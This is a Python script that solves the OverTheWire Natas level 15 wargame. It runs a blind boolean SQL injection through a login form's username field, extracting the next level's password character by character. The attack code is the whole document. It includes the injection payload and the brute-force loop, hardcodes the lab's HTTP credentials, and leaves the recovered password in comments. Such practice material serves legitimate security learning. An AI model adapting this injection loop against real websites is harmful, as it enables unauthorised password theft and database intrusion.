#!/usr/bin/env python
# encoding: utf-8

import string
#import os
import time
import requests

NATAS_USER='natas15'
NATAS_PASS = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
NATAS_URL = 'http://natas15.natas.labs.overthewire.org/index.php'
CHARS = "%s%s" % (string.ascii_letters, string.digits)
SQL = """natas16" and password like Binary 'PASSWORD%' #"""

def has_user(sql):
    data = {
        'username' : sql,
    }
    auth = (NATAS_USER, NATAS_PASS)
    result = requests.post(NATAS_URL, auth=auth, data=data)
    #print result.text
    return False if result.text.find('user exist') == -1 else True

def guess_pw(length=2, password=''):
    length = length - len(password)
    for i in range(1, length + 1):
        for c in CHARS:
            sql = SQL.replace('PASSWORD', "%s%s" % (password, c))
            print sql
            if has_user(sql):
                password += c
                break
            time.sleep(0.1)
    return password

if __name__ == '__main__':
    #. waiheacj63wnnibroheqi3p9t0m5nhmh
    #. WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
    password =  guess_pw(length=32,
                   password='')
    print "Password: %s, Length: %s" % (password, len(password))

